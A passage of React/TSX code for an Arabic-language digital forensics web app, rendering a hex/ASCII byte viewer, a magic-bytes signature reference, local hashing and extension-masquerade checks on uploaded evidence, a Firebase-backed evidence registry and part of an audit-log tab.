                            placeholder="بحث في Hex أو ASCII (مثل: FF D8 أو Exif أو PDF أو MZ)..."
                            className="w-full pr-9 pl-3 py-2 bg-gray-900 border border-gray-800 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-[#D4AF37]"
                          />
                        </div>
                        <div className="flex items-center gap-2 text-xs font-mono shrink-0">
                          <button
                            onClick={() => setHexPageOffset(Math.max(0, safeOffset - bytesPerPage))}
                            disabled={safeOffset === 0}
                            className="px-2.5 py-1.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 rounded-lg text-gray-300 disabled:opacity-40"
                          >
                            السابق
                          </button>
                          <span className="text-gray-400">
                            {safeOffset}..{Math.min(totalLoaded, safeOffset + bytesPerPage)} / {totalLoaded}
                          </span>
                          <button
                            onClick={() => setHexPageOffset(safeOffset + bytesPerPage < totalLoaded ? safeOffset + bytesPerPage : safeOffset)}
                            disabled={safeOffset + bytesPerPage >= totalLoaded}
                            className="px-2.5 py-1.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 rounded-lg text-gray-300 disabled:opacity-40"
                          >
                            التالي
                          </button>
                        </div>
                      </div>

                      {/* Live Single-Byte Bit/Dec/ASCII Inspector */}
                      <div className="bg-gray-950 border border-[#D4AF37]/30 rounded-xl p-3 flex items-center justify-between gap-2 text-xs font-mono">
                        {selectedHexVal !== null && selectedDecVal !== null && hexSelectedByteIndex !== null ? (
                          <>
                            <div>
                              <div className="text-[10px] text-gray-500">Offset 0x{hexSelectedByteIndex.toString(16).padStart(4, '0').toUpperCase()}</div>
                              <div className="text-white font-bold">
                                HEX: <span className="text-[#D4AF37]">{selectedHexVal}</span> | DEC: <span className="text-emerald-400">{selectedDecVal}</span>
                              </div>
                            </div>
                            <div className="text-left" dir="ltr">
                              <div className="text-[10px] text-gray-500">BIN: {selectedDecVal.toString(2).padStart(8, '0')}</div>
                              <div className="text-blue-400">
                                ASCII: {selectedDecVal >= 32 && selectedDecVal <= 126 ? `'${String.fromCharCode(selectedDecVal)}'` : 'Non-Printable'}
                              </div>
                            </div>
                          </>
                        ) : (
                          <div className="text-gray-500 text-xs w-full text-center">انقر على أي بايت في الجدول لفحص قيمته الثنائية والـ ASCII</div>
                        )}
                      </div>
                    </div>

                    {/* Side-by-Side Forensic Hex + ASCII Editor Grid */}
                    <div className="bg-gray-950 border border-gray-800 rounded-xl overflow-x-auto" dir="ltr">
                      <table className="w-full font-mono text-xs border-collapse">
                        <thead className="bg-gray-900 text-gray-400 border-b border-gray-800 text-[11px]">
                          <tr>
                            <th className="px-3 py-2 text-left w-24">Offset (h)</th>
                            <th className="px-3 py-2 text-left">00 01 02 03 04 05 06 07 &nbsp; 08 09 0A 0B 0C 0D 0E 0F</th>
                            <th className="px-3 py-2 text-left w-44 border-l border-gray-800">Decoded ASCII</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-900">
                          {Array.from({ length: rowsCount }).map((_, rowIdx) => {
                            const rowBaseOffset = safeOffset + rowIdx * 16;
                            const rowSlice = pageBytes.slice(rowIdx * 16, rowIdx * 16 + 16);
                            const rowHexStr = rowSlice.join(' ').toLowerCase();
                            const rowAscii = rowSlice
                              .map(h => {
                                const code = parseInt(h, 16);
                                return code >= 32 && code <= 126 ? String.fromCharCode(code) : '.';
                              })
                              .join('');
                            const isRowMatched = Boolean(
                              qNorm && (rowHexStr.includes(qNorm) || rowAscii.toLowerCase().includes(qNorm))
                            );

                            return (
                              <tr
                                key={rowBaseOffset}
                                className={`transition ${isRowMatched ? 'bg-[#D4AF37]/15' : 'hover:bg-gray-900/60'}`}
                              >
                                <td className="px-3 py-1.5 text-[#D4AF37]/80 select-none">
                                  0x{rowBaseOffset.toString(16).padStart(8, '0').toUpperCase()}
                                </td>
                                <td className="px-3 py-1.5">
                                  <div className="flex items-center gap-1 flex-nowrap">
                                    {rowSlice.map((hexByte, colIdx) => {
                                      const absIdx = rowBaseOffset + colIdx;
                                      const isSelected = hexSelectedByteIndex === absIdx;
                                      const isMagicHeader = absIdx < 16;
                                      return (
                                        <button
                                          key={absIdx}
                                          type="button"
                                          onClick={() => setHexSelectedByteIndex(absIdx)}
                                          className={`px-1 py-0.5 rounded transition ${colIdx === 8 ? 'ml-2' : ''} ${
                                            isSelected
                                              ? 'bg-[#D4AF37] text-gray-950 font-bold'
                                              : isMagicHeader
                                              ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 hover:bg-emerald-500/25'
                                              : hexByte === '00'
                                              ? 'text-gray-600 hover:bg-gray-800'
                                              : 'text-gray-200 hover:bg-gray-800'
                                          }`}
                                          title={`Offset 0x${absIdx.toString(16).toUpperCase()} (${absIdx})`}
                                        >
                                          {hexByte}
                                        </button>
                                      );
                                    })}
                                  </div>
                                </td>
                                <td className="px-3 py-1.5 border-l border-gray-800 tracking-wider text-gray-300 whitespace-pre">
                                  {rowAscii}
                                </td>
                              </tr>
                            );
                          })}
                        </tbody>
                      </table>
                    </div>
                  </div>
                ) : (
                  <div className="py-14 text-center text-gray-500 text-sm space-y-2">
                    <Code className="w-10 h-10 text-gray-700 mx-auto" />
                    <p>اسحب وأفلت أي ملف هنا أو استخدم زر "فتح أي ملف في عارض Hex" لاستعراض البايتات الخام والترويسة السحرية.</p>
                  </div>
                )}
              </div>

              {/* Magic Bytes Reference Database */}
              <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-sm font-bold text-white">قاعدة بيانات الترويسات السحرية القياسية (Magic Bytes Reference)</h3>
                    <p className="text-xs text-gray-400">مرجع التواقيع الثنائية لمقارنة ترويسة الملف المكتشفة وكشف التمويه.</p>
                  </div>
                  <span className="text-xs font-mono text-[#D4AF37]">{KNOWN_MAGIC_SIGNATURES.length} توقيع نشط</span>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                  {KNOWN_MAGIC_SIGNATURES.map((sig) => {
                    const normalizedHeader = (activeHex?.headerHex || '').toUpperCase();
                    const sigPrefix = sig.signatureHex.split('..')[0].trim().toUpperCase();
                    const isMatched = Boolean(activeHex && sigPrefix && normalizedHeader.startsWith(sigPrefix));
                    return (
                      <div
                        key={sig.signatureHex}
                        className={`p-3 rounded-xl border transition ${
                          isMatched
                            ? 'bg-emerald-500/10 border-emerald-500/40'
                            : 'bg-gray-950 border-gray-800'
                        }`}
                      >
                        <div className="flex items-center justify-between gap-2 mb-1">
                          <span className={`font-mono text-xs font-bold ${isMatched ? 'text-emerald-400' : 'text-[#D4AF37]'}`} dir="ltr">
                            {sig.signatureHex}
                          </span>
                          <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-gray-900 text-gray-400 border border-gray-800">
                            .{sig.extensions.join(' .')}
                          </span>
                        </div>
                        <div className="text-xs text-gray-200 font-medium">{sig.format}</div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          );
        })()}

        {/* Tab: Evidence Management & Real Firebase Storage Intake */}
        {isTabVisible('evidence') && (
          <div className="space-y-6">
            {/* Local Binary Intake (SHA-256 & Hex Bytes) + Firebase Storage Uploader */}
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 space-y-6">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                <div>
                  <h2 className="text-lg font-bold text-white flex items-center gap-2">
                    <Database className="w-5 h-5 text-[#D4AF37]" />
                    استلام الأدلة الرقمية وفحص SHA-256 / Hex محلياً والرفع السحابي
                  </h2>
                  <p className="text-xs text-gray-400">
                    يتم حساب البصمة التشفيرية (SHA-256 / SHA-512 / SHA-1 / MD5) وقراءة بايتات Hex محلياً في المتصفح قبل الرفع المشفر إلى Firebase Storage.
                  </p>
                </div>
                <div className={`px-3 py-1.5 rounded-xl border text-xs font-bold flex items-center gap-2 self-start ${
                  isCloudAuthenticated
                    ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                    : 'bg-amber-500/10 border-amber-500/30 text-amber-400'
                }`}>
                  {isCloudAuthenticated ? <Cloud className="w-4 h-4" /> : <CloudOff className="w-4 h-4" />}
                  {isCloudAuthenticated ? 'Firebase Storage متصل ومفعل' : 'الوضع المحلي المعزول (فحص تشفيري محلي)'}
                </div>
              </div>

              {/* Dropzone */}
              <div
                onDragOver={(e) => { e.preventDefault(); setIsDraggingEvidence(true); }}
                onDragLeave={() => setIsDraggingEvidence(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDraggingEvidence(false);
                  const dropped = e.dataTransfer.files?.[0];
                  if (dropped) handleEvidenceVaultUpload(dropped);
                }}
                className={`border-2 border-dashed rounded-2xl p-8 text-center transition ${
                  isDraggingEvidence
                    ? 'border-[#D4AF37] bg-[#D4AF37]/10'
                    : 'border-gray-700 bg-gray-950/60 hover:border-[#D4AF37]/60'
                }`}
              >
                <Upload className="w-10 h-10 text-[#D4AF37] mx-auto mb-3" />
                <h3 className="text-sm font-bold text-white mb-1">اسحب أي ملف دليل رقمي وأفلته هنا أو اختره من جهازك</h3>
                <p className="text-xs text-gray-500 mb-4">
                  يدعم جميع الصيغ (PDF, EXE, DLL, ZIP, DOCX, JPG, PNG, LOG, BIN, ELF) لفحص Magic Bytes والـ Hex وبصمة SHA-256 فوراً
                </p>
                <label className="inline-flex items-center gap-2 px-5 py-2.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl cursor-pointer transition shadow-lg">
                  <FileSearch className="w-4 h-4" />
                  اختيار ملف للفحص المحلي والرفع لـ Storage
                  <input
                    type="file"
                    accept="*/*"
                    onChange={(e) => {
                      const f = e.target.files?.[0];
                      e.target.value = '';
                      if (f) handleEvidenceVaultUpload(f);
                    }}
                    className="hidden"
                  />
                </label>
              </div>

              {/* Live Firebase Storage Upload Progress Bar */}
              {storageUploadState.status !== 'idle' && (
                <div className={`p-4 rounded-xl border space-y-2 ${
                  storageUploadState.status === 'error'
                    ? 'bg-red-500/10 border-red-500/30 text-red-300'
                    : storageUploadState.status === 'done'
                    ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
                    : 'bg-gray-950 border-[#D4AF37]/40 text-gray-200'
                }`}>
                  <div className="flex items-center justify-between text-xs font-bold">
                    <span className="flex items-center gap-2">
                      {storageUploadState.active && <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#D4AF37]" />}
                      {storageUploadState.fileName}: {storageUploadState.message}
                    </span>
                    <span className="font-mono">{storageUploadState.progress}%</span>
                  </div>
                  <div className="w-full h-2 bg-gray-800 rounded-full overflow-hidden">
                    <div
                      className={`h-full transition-all duration-300 ${
                        storageUploadState.status === 'error'
                          ? 'bg-red-500'
                          : storageUploadState.status === 'done'
                          ? 'bg-emerald-500'
                          : 'bg-[#D4AF37]'
                      }`}
                      style={{ width: `${storageUploadState.progress}%` }}
                    />
                  </div>
                </div>
              )}

              {/* Local Binary Inspection Result (SHA-256 + Magic Bytes + 16-Byte Row Hex Dump) */}
              {evidenceLocalInspection && (
                <div className="bg-gray-950 border border-gray-800 rounded-2xl p-5 space-y-5">
                  <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-4 border-b border-gray-800">
                    <div>
                      <div className="text-xs font-bold text-[#D4AF37] uppercase font-mono">Local Binary & Hex Inspection Output</div>
                      <h3 className="text-base font-bold text-white mt-0.5">{evidenceLocalInspection.fileName}</h3>
                      <p className="text-[11px] text-gray-400 font-mono">
                        الحجم: {evidenceLocalInspection.fileSizeFormatted} • الصيغة المكتشفة: {evidenceLocalInspection.binary.detectedFileType}
                      </p>
                    </div>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className={`px-2.5 py-1 rounded-lg text-[10px] font-bold border ${
                        evidenceLocalInspection.evidenceId
                          ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                          : 'bg-gray-900 border-gray-700 text-gray-300'
                      }`}>
                        {evidenceLocalInspection.evidenceId
                          ? `محفوظ في Firestore (${evidenceLocalInspection.evidenceId.substring(0, 10)}...)`
                          : 'نتيجة الفحص المحلي'}
                      </span>
                      {evidenceLocalInspection.syncedToCloud && (
                        <span className="px-2.5 py-1 rounded-lg text-[10px] font-bold border bg-blue-500/10 border-blue-500/30 text-blue-400">
                          مرفوع في Firebase Storage
                        </span>
                      )}
                      {evidenceLocalInspection.evidenceId && (
                        <button
                          onClick={() => fetchCustodyHistory(evidenceLocalInspection.evidenceId!)}
                          className="px-3 py-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg text-xs font-bold flex items-center gap-1.5 transition"
                        >
                          <History className="w-3.5 h-3.5" />
                          سلسلة الحيازة
                        </button>
                      )}
                    </div>
                  </div>

                  {evidenceLocalInspection.binary.isMasqueraded && (
                    <div className="bg-red-500/10 border border-red-500/30 p-3.5 rounded-xl flex items-start gap-2.5 text-red-400 text-xs">
                      <AlertOctagon className="w-4 h-4 shrink-0 mt-0.5" />
                      <div>
                        <span className="font-bold block">تحذير تزوير امتداد الملف (Masquerade Detected)</span>
                        {evidenceLocalInspection.binary.masqueradeWarning}
                      </div>
                    </div>
                  )}

                  {/* Cryptographic Hashes + Magic Bytes True Extension Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 font-mono text-xs">
                    <div className="bg-gray-900 border border-gray-800 p-3 rounded-xl space-y-1">
                      <div className="flex items-center justify-between text-[10px] text-gray-400">
                        <span>SHA-256 (Web Crypto API)</span>
                        <button
                          onClick={() => copyToClipboard(evidenceLocalInspection.binary.sha256, 'ev-sha256')}
                          className="text-[#D4AF37] hover:underline flex items-center gap-1"
                        >
                          {copiedHash === 'ev-sha256' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                          نسخ
                        </button>
                      </div>
                      <div className="text-emerald-400 break-all select-all text-[11px]">{evidenceLocalInspection.binary.sha256}</div>
                    </div>
                    <div className="bg-gray-900 border border-gray-800 p-3 rounded-xl space-y-1">
                      <div className="flex items-center justify-between text-[10px] text-gray-400">
                        <span>Magic Bytes & الامتداد الحقيقي</span>
                        <span className="text-emerald-400">
                          {evidenceLocalInspection.binary.expectedExtensions?.length
                            ? `.${evidenceLocalInspection.binary.expectedExtensions.join(' / .')}`
                            : 'Binary'}
                        </span>
                      </div>
                      <div className="text-[#D4AF37] text-[11px] truncate" dir="ltr">{evidenceLocalInspection.binary.headerHex}</div>
                      <div className="text-gray-300 text-[10px] truncate">{evidenceLocalInspection.binary.detectedFileType}</div>
                    </div>
                    <div className="bg-gray-900 border border-gray-800 p-3 rounded-xl space-y-1">
                      <div className="flex items-center justify-between text-[10px] text-gray-400">
                        <span>MD5 / SHA-1 / Entropy</span>
                        <span className="text-[#D4AF37]">Entropy: {evidenceLocalInspection.binary.entropy}/8.0</span>
                      </div>
                      <div className="text-gray-300 break-all text-[11px]">MD5: {evidenceLocalInspection.binary.md5}</div>
                      <div className="text-gray-500 break-all text-[10px]">SHA-1: {evidenceLocalInspection.binary.sha1}</div>
                    </div>
                  </div>

                  {/* Structured 16-Bytes-Per-Row Hex & ASCII Dump */}
                  <div className="space-y-2">
                    <div className="flex items-center justify-between text-xs">
                      <span className="font-bold text-white flex items-center gap-1.5">
                        <FileCode className="w-4 h-4 text-[#D4AF37]" />
                        مصفوفة البايتات الثنائية المحلية (Local Hex Bytes & ASCII Dump — أول {evidenceLocalInspection.binary.hexBytes.length} بايت)
                      </span>
                      <span className="font-mono text-[10px] text-gray-400">Header: {evidenceLocalInspection.binary.headerHex}</span>
                    </div>
                    <div className="bg-black/80 border border-gray-800 rounded-xl p-4 font-mono text-[11px] overflow-x-auto space-y-1" dir="ltr">
                      {Array.from({ length: Math.ceil(evidenceLocalInspection.binary.hexBytes.length / 16) }).map((_, rowIdx) => {
                        const rowBytes = evidenceLocalInspection.binary.hexBytes.slice(rowIdx * 16, rowIdx * 16 + 16);
                        const offsetHex = (rowIdx * 16).toString(16).padStart(4, '0').toUpperCase();
                        const ascii = rowBytes
                          .map((hex) => {
                            const code = parseInt(hex, 16);
                            return code >= 32 && code <= 126 ? String.fromCharCode(code) : '.';
                          })
                          .join('');
                        return (
                          <div key={rowIdx} className="flex items-center gap-4 hover:bg-gray-900/70 px-2 py-0.5 rounded">
                            <span className="text-gray-500 shrink-0 select-none">0x{offsetHex}</span>
                            <div className="flex flex-wrap gap-1.5 min-w-[360px] text-emerald-400">
                              {rowBytes.map((b, i) => (
                                <span key={i} className={rowIdx === 0 && i < 8 ? 'text-[#D4AF37] font-bold' : ''}>
                                  {b}
                                </span>
                              ))}
                            </div>
                            <span className="text-gray-400 border-l border-gray-800 pl-3 shrink-0 tracking-wider">{ascii}</span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Evidence Cloud & Local Registry Table */}
            <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6">
                <div>
                  <h2 className="text-lg font-bold text-white">سجل الأدلة الرقمية (Evidence Registry)</h2>
                  <p className="text-xs text-gray-400">
                    متزامن لحظياً مع Firestore ({evidenceList.length} دليل) ومرتبط بملفات Firebase Storage.
                  </p>
                </div>
                <div className="flex items-center gap-3">
                  <select 
                    value={currentInvestigationId || ''} 
                    onChange={(e) => setCurrentInvestigationId(e.target.value)}
                    className="bg-gray-950 border border-gray-800 rounded-lg text-xs text-white px-3 py-2 outline-none focus:border-[#D4AF37]"
                  >
                    <option value="">جميع التحقيقات</option>
                    {investigations.map(inv => (
                      <option key={inv.id} value={inv.id}>{inv.title}</option>
                    ))}
                  </select>
                  <button 
                    onClick={() => fetchEvidence()}
                    className="p-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-[#D4AF37] transition"
                    title="تحديث البيانات"
                  >
                    <RefreshCw className={`w-4 h-4 ${evidenceLoading ? 'animate-spin' : ''}`} />
                  </button>
                  <button
                    onClick={() => setActiveTab('reports')}
                    className="px-3 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold rounded-lg text-xs inline-flex items-center gap-1.5 transition"
                  >
                    <FileText className="w-3.5 h-3.5" />
                    تصدير تقرير رسمي (SHA-256)
                  </button>
                </div>
              </div>

              {evidenceLoading ? (
                <div className="text-center py-20">
                  <RefreshCw className="w-8 h-8 text-[#D4AF37] animate-spin mx-auto mb-4" />
                  <p className="text-gray-400 text-sm">جاري مزامنة الأدلة من Firestore...</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full text-sm text-right">
                    <thead className="text-xs text-gray-500 uppercase bg-gray-950/50">
                      <tr>
                        <th className="px-4 py-3 font-medium">الملف</th>
                        <th className="px-4 py-3 font-medium">التخزين</th>
                        <th className="px-4 py-3 font-medium">SHA-256</th>
                        <th className="px-4 py-3 font-medium">الأصالة</th>
                        <th className="px-4 py-3 font-medium">التاريخ</th>
                        <th className="px-4 py-3 font-medium">التحقيق</th>
                        <th className="px-4 py-3 font-medium">إجراءات</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-800">
                      {evidenceList
                        .filter(e => !currentInvestigationId || e.investigationId === currentInvestigationId)
                        .map(ev => (
                          <tr key={ev.id} className="bg-transparent hover:bg-gray-800/30 transition group">
                            <td className="px-4 py-4">
                              <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-lg bg-black border border-gray-800 overflow-hidden flex items-center justify-center shrink-0">
                                  {ev.fileUrl && ev.mimeType.startsWith('image/') ? (
                                    <img src={ev.fileUrl} alt="" className="max-w-full max-h-full object-cover" />
                                  ) : (
                                    <FileCode className="w-5 h-5 text-[#D4AF37]" />
                                  )}
                                </div>
                                <div>
                                  <span className="text-white font-medium truncate max-w-[160px] block">{ev.fileName}</span>
                                  <span className="text-[10px] font-mono text-gray-500">{formatFileSize(ev.fileSize || 0)} • {ev.mimeType.split('/')[1]?.toUpperCase() || 'BIN'}</span>
                                </div>
                              </div>
                            </td>
                            <td className="px-4 py-4">
                              {ev.storageStatus === 'cloud' || (ev.fileUrl && ev.fileUrl.includes('firebasestorage')) ? (
                                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-bold">
                                  <Cloud className="w-3 h-3" />
                                  Storage
                                </span>
                              ) : (
                                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-amber-500/10 text-amber-400 border border-amber-500/30 text-[10px] font-bold">
                                  <CloudOff className="w-3 h-3" />
                                  محلي
                                </span>
                              )}
                            </td>
                            <td className="px-4 py-4 font-mono text-[10px] text-[#D4AF37]">
                              <button
                                onClick={() => copyToClipboard(ev.sha256, `row-${ev.id}`)}
                                className="hover:underline flex items-center gap-1"
                                title={ev.sha256}
                              >
                                {ev.sha256.substring(0, 12)}...
                                {copiedHash === `row-${ev.id}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3 opacity-60" />}
                              </button>
                            </td>
                            <td className="px-4 py-4">
                              <div className="flex items-center gap-2">
                                <div className="flex-1 h-1.5 w-12 bg-gray-800 rounded-full overflow-hidden">
                                  <div 
                                    className={`h-full ${ev.analysis.authenticityScore > 80 ? 'bg-[#10B981]' : ev.analysis.authenticityScore > 50 ? 'bg-amber-500' : 'bg-red-500'}`}
                                    style={{ width: `${ev.analysis.authenticityScore}%` }}
                                  ></div>
                                </div>
                                <span className="text-[10px] font-bold text-white">{ev.analysis.authenticityScore}%</span>
                              </div>
                            </td>
                            <td className="px-4 py-4 text-[10px] text-gray-500">
                              {formatTimestampSafe(ev.createdAt)}
                            </td>
                            <td className="px-4 py-4 text-xs text-gray-400">
                              {investigations.find(inv => inv.id === ev.investigationId)?.title || 'افتراضي'}
                            </td>
                            <td className="px-4 py-4">
                              <div className="flex items-center gap-1.5 opacity-90 group-hover:opacity-100 transition">
                                <button
                                  onClick={() => {
                                    setEvidenceLocalInspection({
                                      fileName: ev.fileName,
                                      fileSize: ev.fileSize,
                                      fileSizeFormatted: formatFileSize(ev.fileSize || 0),
                                      mimeType: ev.mimeType,
                                      syncedToCloud: ev.storageStatus === 'cloud' || Boolean(ev.fileUrl && ev.fileUrl.includes('firebasestorage')),
                                      fileUrl: ev.fileUrl,
                                      storagePath: ev.storagePath,
                                      evidenceId: ev.id,
                                      binary: {
                                        hexBytes: ev.analysis?.hexBytes || [],
                                        headerHex: ev.analysis?.headerHex || (ev.analysis?.hexBytes || []).slice(0, 16).join(' '),
                                        headerAscii: ev.analysis?.headerAscii || '',
                                        detectedFileType: ev.analysis?.detectedFileType || ev.mimeType,
                                        mimeTypeDetected: ev.mimeType,
                                        expectedExtensions: ev.analysis?.expectedExtensions || [],
                                        isExecOrDangerous: Boolean(ev.analysis?.isMasqueraded),
                                        entropy: ev.analysis?.entropy ?? 0,
                                        entropyClassification: ev.analysis?.entropyClassification || 'طبيعي',
                                        isMasqueraded: Boolean(ev.analysis?.isMasqueraded),
                                        masqueradeWarning: ev.analysis?.masqueradeWarning || null,
                                        sha256: ev.sha256,
                                        sha1: ev.sha1 || ev.analysis?.sha1 || '',
                                        sha512: ev.sha512 || ev.analysis?.sha512 || '',
                                        md5: ev.md5 || ev.analysis?.md5 || ''
                                      }
                                    });
                                    window.scrollTo({ top: 0, behavior: 'smooth' });
                                  }}
                                  className="p-1.5 bg-gray-800 hover:bg-[#D4AF37] hover:text-gray-950 rounded-md transition"
                                  title="عرض Hex Bytes و SHA-256"
                                >
                                  <FileCode className="w-3.5 h-3.5" />
                                </button>
                                <button 
                                  onClick={() => {
                                    setAnalysisResult(ev.analysis);
                                    setSelectedImage(ev.fileUrl);
                                    setLastAnalyzedEvidenceId(ev.id);
                                    recordCustodyLedgerBlock(
                                      ev.id,
                                      'FILE_INSPECTION',
                                      `فتح وفحص سجل الدليل (${ev.fileName})`,
                                      'سجل الأدلة الرقمية - وحدة التحليل',
                                      `SHA-256=${ev.sha256.substring(0, 20)}...`
                                    );
                                    setActiveTab('analyzer');
                                  }}
                                  className="p-1.5 bg-gray-800 hover:bg-[#D4AF37] hover:text-gray-950 rounded-md transition"
                                  title="عرض التحليل الكامل"
                                >
                                  <Search className="w-3.5 h-3.5" />
                                </button>
                                {isCloudAuthenticated && ev.storageStatus !== 'cloud' && (
                                  <button
                                    onClick={() => syncEvidenceToCloud(ev)}
                                    className="p-1.5 bg-gray-800 hover:bg-emerald-600 hover:text-white rounded-md transition"
                                    title="مزامنة ورفع إلى Firebase Storage"
                                  >
                                    <Cloud className="w-3.5 h-3.5" />
                                  </button>
                                )}
                                {ev.fileUrl && (
                                  <a 
                                    href={sanitizeSafeHref(ev.fileUrl, true)} 
                                    target="_blank" 
                                    rel="noopener noreferrer"
                                    className="p-1.5 bg-gray-800 hover:bg-blue-500 hover:text-white rounded-md transition"
                                    title="تحميل الملف من Firebase Storage"
                                  >
                                    <Download className="w-3.5 h-3.5" />
                                  </a>
                                )}
                                <button 
                                  onClick={() => fetchCustodyHistory(ev.id)}
                                  className="p-1.5 bg-gray-800 hover:bg-emerald-500 hover:text-white rounded-md transition"
                                  title="سلسلة الحيازة"
                                >
                                  <History className="w-3.5 h-3.5" />
                                </button>
                                <button 
                                  onClick={() => {
                                    if (!comparisonItems.a) setComparisonItems({ ...comparisonItems, a: ev });
                                    else if (!comparisonItems.b) setComparisonItems({ ...comparisonItems, b: ev });
                                    else setComparisonItems({ a: ev, b: null });
                                    setActiveTab('comparison');
                                  }}
                                  className="p-1.5 bg-gray-800 hover:bg-purple-500 hover:text-white rounded-md transition"
                                  title="إضافة للمقارنة"
                                >
                                  <Diff className="w-3.5 h-3.5" />
                                </button>
                                <button
                                  onClick={() => deleteEvidenceItem(ev)}
                                  className="p-1.5 bg-gray-800 hover:bg-red-600 hover:text-white rounded-md transition"
                                  title="حذف من Storage و Firestore"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            </td>
                          </tr>
                        ))}
                      {!evidenceLoading && evidenceList.length === 0 && (
                        <tr>
                          <td colSpan={7} className="text-center py-20 text-gray-500">لا توجد أدلة محفوظة حالياً. قم برفع ملف في الأعلى لفحصه وحفظه.</td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Tab: Persistent & Cloud Audit Log */}
        {isTabVisible('audit') && (
          <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-6">
            {/* New Investigation Form */}
            <div className="bg-gray-950 p-6 rounded-xl border border-gray-800 space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-bold text-gray-200">إنشاء تحقيق جديد</h3>
                <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold flex items-center gap-1.5 ${
                  isCloudAuthenticated
                    ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                    : 'bg-amber-500/10 text-amber-400 border border-amber-500/30'
                }`}>
                  {isCloudAuthenticated ? <Cloud className="w-3 h-3" /> : <CloudOff className="w-3 h-3" />}
                  {isCloudAuthenticated ? 'مزامنة Firestore الحية (onSnapshot)' : 'التخزين المحلي'}
                </span>
              </div>
              <form onSubmit={async (e) => {
                e.preventDefault();
                const formEl = e.currentTarget;
                const titleInput = formEl.elements.namedItem('title') as HTMLInputElement | null;
                const title = titleInput?.value.trim() || '';
                if (!title) return;
                await createNewInvestigation(title);
                if (titleInput) titleInput.value = '';
              }} className="flex gap-3">
                <input name="title" placeholder="اسم التحقيق الجديد..." className="flex-1 px-4 py-3 bg-gray-900 border border-gray-800 rounded-lg text-sm text-white outline-none focus:border-[#D4AF37]" required />
                <button type="submit" className="px-5 py-3 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold rounded-lg text-sm transition">إنشاء</button>
              </form>
            </div>

            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-gray-800">
              <div>
                <h2 className="text-lg font-bold text-white">السجل التشغيلي والدائم (Firestore Live Audit Log)</h2>
                <p className="text-xs text-gray-400">
                  يكتب ويقرأ السجلات الجنائية مباشرة من مجموعة <code className="text-[#D4AF37]">audit_logs</code> في Firestore بشكل لحظي وغير قابل للتلاعب.
                </p>
              </div>
              <div className="flex flex-wrap items-center gap-3">
                <input
                  type="text"
                  value={auditSearchQuery}
                  onChange={(e) => setAuditSearchQuery(e.target.value)}
                  placeholder="بحث باسم الملف أو البصمة SHA-256..."
                  className="bg-gray-950 border border-gray-800 rounded-lg px-3 py-1.5 text-xs text-white outline-none focus:border-[#D4AF37] min-w-[220px]"
                />
                {!isCloudAuthenticated && auditLogs.length > 0 && (
                  <button 
                    onClick={() => { setAuditLogs([]); localStorage.removeItem('siyadi_audit_logs'); }}
                    className="px-3 py-1.5 bg-red-600/10 hover:bg-red-600/20 text-red-400 border border-red-500/30 text-xs rounded-lg transition flex items-center gap-1.5"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                    مسح السجل المحلي
                  </button>
                )}
              </div>
            </div>

            {auditLogs.length > 0 ? (
              <div className="overflow-x-auto">
                <table className="w-full text-right text-xs">
                  <thead className="bg-gray-950 text-gray-400 border-b border-gray-800">
                    <tr>
                      <th className="p-3">التاريخ والوقت</th>
                      <th className="p-3">العنصر</th>
                      <th className="p-3">SHA-256</th>
                      <th className="p-3">الحجم / الطول</th>
                      <th className="p-3">الأصالة</th>
                      <th className="p-3">النتيجة</th>
                      <th className="p-3">المزامنة</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-800">
                    {auditLogs
                      .filter(log =>
                        !auditSearchQuery.trim() ||
                        log.fileName.toLowerCase().includes(auditSearchQuery.toLowerCase()) ||
                        log.sha256.toLowerCase().includes(auditSearchQuery.toLowerCase()) ||
